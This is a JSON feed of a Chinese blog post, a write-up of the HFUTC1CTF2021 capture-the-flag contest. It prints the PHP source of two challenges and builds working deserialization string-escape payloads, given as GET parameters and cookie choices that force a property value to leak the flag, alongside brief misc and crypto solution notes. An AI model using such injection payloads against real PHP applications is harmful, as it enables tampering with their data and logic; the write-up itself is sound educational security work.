{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"笔记\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/d762243c/",
            "url": "http://dpm12345.cn/posts/d762243c/",
            "title": "HFUTC1CTF2021",
            "date_published": "2022-07-23T12:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h2><h2 id=\"version\"><a href=\"#version\" class=\"headerlink\" title=\"version\"></a>version</h2><h2 id=\"baby-escape\"><a href=\"#baby-escape\" class=\"headerlink\" title=\"baby escape\"></a>baby escape</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nclass Foo\n{\n    public $key;\n    public $test = 'nonono';\n    public function __construct($k)\n    {\n        $this-&gt;key = $k;\n    }\n}\n$k = $_GET['k'];\nif (isset($k)) {\n    $foo = new Foo($k);\n    $msg = str_replace('HFUT', 'C1CTF_IS_FUN', serialize($foo));\n    $foo_ultimate = unserialize($msg);\n    if ($foo_ultimate-&gt;test === 'C1CTF_IS_FUN') {\n        echo ($flag);\n    } else {\n        echo (\"what are you doing??\");\n    }\n}\n</code></pre>\n<p>很明显为反序列化字符串逃逸4–&gt;12，增加了8个字符 将最后的代码放到网页文件跑一下就行</p>\n<p>由于<code>test</code>在<code>key</code>，那么必然要提前闭合，在之前就序列化<code>test</code>的值 </p>\n<p>所以<code>key</code>的后半部分必为<code>s:4:\"test\";s:12:\"C1CTF_IS_FUN\";}</code></p>\n<p>先进行上述字符串的序列化，得到</p>\n<pre><code class=\"php\">O:3:\"Foo\":2:{s:3:\"key\";s:32:\"s:4:\"test\";s:12:\"C1CTF_IS_FUN\";}\";s:4:\"test\";s:6:\"nonono\";}\n</code></pre>\n<p>计算<code>key</code>的值的前引号后第一个(即<code>s</code>) 到第一个<code>}</code>的长度，为32 ，恰好为4个8，但由于需要闭合前一个引号，故总共为34个字符（闭合引号，分号)</p>\n<p>所以需要5个<code>HUFT</code>，为了匹配，可在<code>}</code>后加6个字符(因为已经提前结束，无影响)</p>\n<p>故 payload 为</p>\n<pre><code class=\"raw\">k=HFUTHFUTHFUTHFUTHFUT\";s:4:\"test\";s:12:\"C1CTF_IS_FUN\";};;;;;;\n</code></pre>\n<h2 id=\"easy-escape\"><a href=\"#easy-escape\" class=\"headerlink\" title=\"easy escape\"></a>easy escape</h2><p>最后构造的两个类为</p>\n<pre><code class=\"php\">$foo1 = new Foo4(\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\", '\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}');\n$foo2 = new Foo4(\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\", '\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}');\n</code></pre>\n<p>源代码</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nclass Foo1\n{\n    public $space;\n    public $a;\n    public $test = 'nonono';\n    public $b;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo2\n{\n    public $b;\n    public $test = 'nonono';\n    public $a;\n    public $space;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo3\n{\n    public $a;\n    public $b;\n    public $space;\n    public $test = 'nonono';\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo4\n{\n    public $a;\n    public $test = 'nonono';\n    public $b;\n    public $space;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\n$a1 = $_GET['a1'];\n$b1 = $_GET['b1'];\n$a2 = $_GET['a2'];\n$b2 = $_GET['b2'];\n$choice1 = \"Foo1\";\n$choice2 = \"Foo1\";\nif (isset($_COOKIE[\"choice1\"]) &amp;&amp; isset($_COOKIE[\"choice2\"])) {\n    $choice1 = $_COOKIE[\"choice1\"];\n    $choice2 = $_COOKIE[\"choice2\"];\n}\nif (isset($a1) &amp;&amp; isset($b1) &amp;&amp; isset($a2) &amp;&amp; isset($b2)) {\n    switch ($choice1) {\n        case \"Foo1\":\n            $foo1 = new Foo1($a1, $b1);\n            break;\n        case \"Foo2\":\n            $foo1 = new Foo2($a1, $b1);\n            break;\n        case \"Foo3\":\n            $foo1 = new Foo3($a1, $b1);\n            break;\n        case \"Foo4\":\n            $foo1 = new Foo4($a1, $b1);\n            break;\n        default:\n            $foo1 = new Foo1($a1, $b1);\n    }\n    switch ($choice2) {\n        case \"Foo1\":\n            $foo2 = new Foo1($a2, $b2);\n            break;\n        case \"Foo2\":\n            $foo2 = new Foo2($a2, $b2);\n            break;\n        case \"Foo3\":\n            $foo2 = new Foo3($a2, $b2);\n            break;\n        case \"Foo4\":\n            $foo2 = new Foo4($a2, $b2);\n            break;\n        default:\n            $foo2 = new Foo1($a2, $b2);\n    }\n    $msg1 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo1));\n    $msg2 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo2));\n    $foo_ultimate1 = unserialize($msg1);\n    $foo_ultimate2 = unserialize($msg2);\n    if ($foo_ultimate1-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate1-&gt;a === '' &amp;&amp; $foo_ultimate1-&gt;b === '') {\n        if ($foo_ultimate2-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate2-&gt;b === '' &amp;&amp; $foo_ultimate2-&gt;space === '') {\n            echo ($flag);\n        } else {\n            echo (\"what are you fuxking doing??\");\n        }\n    }\n}\n</code></pre>\n<p>代码分析得最重要部分为后半部分的</p>\n<pre><code class=\"php\">$msg1 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo1));\n$msg2 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo2));\n$foo_ultimate1 = unserialize($msg1);\n$foo_ultimate2 = unserialize($msg2);\nif ($foo_ultimate1-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate1-&gt;a === '' &amp;&amp; $foo_ultimate1-&gt;b === '') {\n    if ($foo_ultimate2-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate2-&gt;b === '' &amp;&amp; $foo_ultimate2-&gt;space === '') {\n        echo ($flag);\n    } else {\n        echo (\"what are you fuxking doing??\");\n    }\n}\n</code></pre>\n<p>看到字符串过滤，很容易想到字符串逃逸，</p>\n<h3 id=\"对第一个-if-判断\"><a href=\"#对第一个-if-判断\" class=\"headerlink\" title=\"对第一个 if 判断\"></a>对第一个 if 判断</h3><p>这里的主要思想为：当<code>$a</code>的字符串比较长时，通过过滤，字符串缩短，使得后面的<code>$b</code>的一部分值包含在变量a的序列化中，即如<code>s:1:\"b\";s:59:\"</code>包含在其中，使得b的序列化并未开始，由于此时冒号后面可自动添加序列化字符串，那么可在原b变量上加上需要满足条件的序列化字符串，即<code>s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";</code>,为了能够使其序列化成功，可在最后加上<code>}</code>，使其提前结束。</p>\n<p>那么接下来的主力工作是要让a的序列化字符串长度在过滤后恰能到达b的字符串值的前引号的位置，由于对space无要求，在以上分析中，只需a在b前即可，即可选用Foo1，Foo3，Foo4三个类，这里采用Foo4</p>\n<p>首先输入空值进行序列化操作，得到</p>\n<pre><code class=\"php\">O:4:\"Foo4\":4:{s:1:\"a\";s:0:\"\";s:4:\"test\";s:6:\"nonono\";s:1:\"b\";s:0:\"\";s:5:\"space\";N;}\n</code></pre>\n<p>计算从a的值的后引号到b的值的前引号的长度，发现为39个，不是12-4=8的倍数，为了满足，可在b的值开头加上任意一个字符(这里使用双引号)，使到其位置恰为40个，为8的5倍，那么a的值应为5个 <code>C1CTF_IS_FUN</code>，据此，前半部分payload为</p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}\n</code></pre>\n<h3 id=\"对第二个-if-判断\"><a href=\"#对第二个-if-判断\" class=\"headerlink\" title=\"对第二个 if 判断\"></a>对第二个 if 判断</h3><p>同理，通过 a的序列化字符串覆盖部分b的值</p>\n<p>那么根据第一个的分析a必须在b的前面，而在第二个判断中对space有要求，那么space必须在a的后面(此前试过在前面，无法正常序列化)。因此，可选择的类有Foo3、Foo4，由于对于Foo4来说，此时的判断只是增加了对space的赋值，只会对b2的赋值有影响，所以如果选用Foo4 ，a2的值仍为5个<code>C1CTF_IS_FUN</code>，而对Foo3来说，中间少了test的序列化字符串，后引号到前引号的长度有所改变，要重新计算 <code>C1CTF_IS_FUN</code>的个数并凑齐倍数，所以为了方便这里还是使用Foo4由于此时对a的值无要求，对space有要求，因此此时<code>b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}</code>故后半部分payload</p>\n<pre><code class=\"php\">a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p>故最后的 payload</p>\n<p><strong>GET</strong></p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p><strong>SESSION</strong></p>\n<pre><code class=\"raw\">choice1 = Foo4\nchoice2 = Foo4\n</code></pre>\n<h3 id=\"同理，第二个使用-Foo3\"><a href=\"#同理，第二个使用-Foo3\" class=\"headerlink\" title=\"同理，第二个使用 Foo3\"></a>同理，第二个使用 Foo3</h3><p>先空字符序列化，得到</p>\n<pre><code class=\"php\">O:4:\"Foo3\":4:{s:1:\"a\";s:0:\"\";s:1:\"b\";s:0:\"\";s:5:\"space\";N;s:4:\"test\";s:6:\"nonono\";}\n</code></pre>\n<p>只有15个字符，那么只需要2个<code>C1CTF_IS_FUN</code>,b添加一个字符即可，故payload为</p>\n<p><strong>GET</strong></p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p><strong>SESSION</strong></p>\n<pre><code class=\"raw\">choice1 = Foo4\nchoice2 = Foo3\n</code></pre>\n<p>同理，对于第一个类的更换也是如此进行</p>\n<h2 id=\"baby-php\"><a href=\"#baby-php\" class=\"headerlink\" title=\"baby php\"></a>baby php</h2><h2 id=\"baby-calculator\"><a href=\"#baby-calculator\" class=\"headerlink\" title=\"baby calculator\"></a>baby calculator</h2><h2 id=\"real-calculator\"><a href=\"#real-calculator\" class=\"headerlink\" title=\"real calculator\"></a>real calculator</h2><h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"bigjpg\"><a href=\"#bigjpg\" class=\"headerlink\" title=\"bigjpg\"></a>bigjpg</h2><h2 id=\"音乐带师\"><a href=\"#音乐带师\" class=\"headerlink\" title=\"音乐带师\"></a>音乐带师</h2><h2 id=\"osint\"><a href=\"#osint\" class=\"headerlink\" title=\"osint\"></a>osint</h2><h2 id=\"幸运饼干\"><a href=\"#幸运饼干\" class=\"headerlink\" title=\"幸运饼干\"></a>幸运饼干</h2><h2 id=\"signin\"><a href=\"#signin\" class=\"headerlink\" title=\"signin\"></a>signin</h2><p>AES解密</p>\n<h2 id=\"qrcode\"><a href=\"#qrcode\" class=\"headerlink\" title=\"qrcode\"></a>qrcode</h2><p>下载得到的rar是损坏文件，用winhex将第一行第三个改为<code>72</code>，保存解压， 得到一个图片和一个txt文件。打开图片发现图片一闪一闪。那么将该图片用ps打开， 到对应图层，发现二维码部分缺失，这时用仿制图章将左下角分别复制到左上和右上，扫描后得到flag</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"嘀嘀嘀\"><a href=\"#嘀嘀嘀\" class=\"headerlink\" title=\"嘀嘀嘀\"></a>嘀嘀嘀</h2><p>点开题目首先确认为摩斯密码，解码后得到一串字母，因题目提示栅栏，故栅栏解密， 当组字数为8时，注意到从右往左为”flagis…..”,由此写程序反转字符串，再将flag内容与flag格式结合得到flag</p>\n",
            "tags": [
                "CTF",
                "笔记"
            ]
        }
    ]
}